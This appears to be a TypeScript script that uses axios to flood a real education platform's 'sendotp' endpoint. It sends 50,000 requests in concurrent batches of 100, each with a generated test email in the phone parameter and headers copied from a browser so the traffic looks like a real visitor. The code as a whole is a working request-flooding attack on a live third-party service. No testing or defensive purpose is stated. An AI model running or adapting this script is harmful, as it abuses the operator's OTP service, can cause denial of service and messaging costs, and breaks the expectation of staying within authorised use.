
import axios from "axios";


async function sendRequest(email: string) {
let config = {
  method: 'get',
  maxBodyLength: Infinity,
  url: `https://harkiratapi.classx.co.in/get/sendotp?phone=${encodeURIComponent(email)}`,
  headers: {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.7',
    'auth-key': 'appxapi',
    'client-service': 'Appx',
    'origin': 'https://harkirat.classx.co.in',
    'priority': 'u=1, i',
    'referer': 'https://harkirat.classx.co.in/',
    'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'source': 'website',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
  }
};

axios.request(config)
.then((response) => {
  console.log(JSON.stringify(response.data));
})
.catch((error) => {
  console.log(error);
})}



async function main() {
  for (let i = 0; i < 50000; i += 100) {
    const promises: Promise<any>[] = [];

    for (let j = 0; j < 100; j++) {
      const email = `test${i + j}@example.com`;
      console.log(email)
      promises.push(sendRequest(email));
    }

    await Promise.all(promises);
    console.log(`Batch ${i} done`);
  }
}

main().catch(console.error);